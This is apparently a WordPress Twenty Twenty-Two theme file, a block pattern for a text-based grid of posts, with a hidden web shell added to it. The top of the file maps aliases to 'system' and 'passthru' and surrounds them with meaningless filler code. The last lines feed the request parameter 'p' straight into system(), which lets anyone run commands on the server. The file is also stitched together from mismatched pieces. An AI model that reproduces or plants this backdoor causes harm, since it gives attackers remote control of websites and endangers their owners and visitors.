<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
/**
 * Text-based grid of posts block pattern
 */
return array(
	'title'      => __( 'Text-based grid of posts', 'twentytwentytwo' ),
	'categories' => array( 'query' ),
	'blockTypes' => array( 'core/query' ),
	'content'    => '<!-- wp:query {"query":{"offset":0,"postType":"post","categoryIds":[],"tagIds":[],"order":"desc","orderBy":"date","author":"","search":"","sticky":"","perPage":12},"displayLayout":{"type":"flex","columns":3},"align":"wide","layout":{"inherit":true}} -->
					<div class="wp-block-query alignwide"><!-- wp:post-template {"align":"wide"} -->

					<!-- wp:post-title {"isLink":true,"fontSize":"x-large"} /-->

					<!-- wp:post-excerpt /-->

					<!-- wp:post-date {"format":"F j, Y","isLink":true,"fontSize":"small"} /-->
					<!-- /wp:post-template -->

					<!-- wp:separator {"align":"wide","className":"is-style-wide"} -->
					<hr class="wp-block-separator alignwide is-style-wide"/>
					<!-- /wp:separator -->

					<!-- wp:query-pagination {"paginationArrow":"arrow","align":"wide","layout":{"type":"flex","justifyContent":"space-between"}} -->
					<!-- wp:query-pagination-previous {"fontSize":"small"} /-->

					<!-- wp:query-pagination-numbers /-->

					<!-- wp:query-pagination-next {"fontSize":"small"} /-->
					<!-- /wp:query-pagination --></div>
					<!-- /wp:query -->',
);

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>